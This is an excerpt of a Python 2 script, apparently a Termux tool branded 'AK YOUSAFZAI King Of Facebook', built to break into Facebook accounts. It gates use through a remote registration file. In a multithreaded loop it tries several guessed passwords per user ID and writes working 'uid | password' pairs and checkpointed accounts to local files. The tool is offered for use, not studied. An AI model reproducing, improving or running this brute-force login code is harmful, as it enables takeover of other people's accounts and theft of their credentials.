...
\033[1;94m  ██          ██            ██       ██
\033[1;91m  ██          ██            ███████████
\033[1;92m     ~~~~AK_YOUSAFZAI_Brand~~~~
\033[1;94m===============================================
\033[1;97m➣ Author : \033[1;97mAK YOUSAFZAI
\033[1;97m➣ UNITY  : \033[1;97mPFG MAKER HERE
\033[1;97m➣ WP  : \033[1;97m03075170124
\033[1;94m==============================================="""
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/AK-KiNg-60/akyousafzai/main/server.txt').text
    if to in r:
...
def reg2():
    ...
    os.system('xdg-open https://wa.me/03075170124')
...
def menu_s():
    ms = raw_input('\033[1;92m╰─AK HERE➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mAK YOUSAFZAI King Of Facebook\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[KING-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/KING_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[QUEEN-CP] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[KING-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/KING_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[QUEEN-CP] ' + uid + ' | ' + pass2
                    cp = open('QUEEN_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[KING-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/KING_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[QUEEN-CP] ' + uid + ' | ' + pass3
                        cp = open('QUEEN_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[KING-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/KING_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[QUEEN-CP] ' + uid + ' | ' + pass4
                            cp = open('QUEEN_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92m AK YOUSAFZAI PROCCESS COMPLETE'
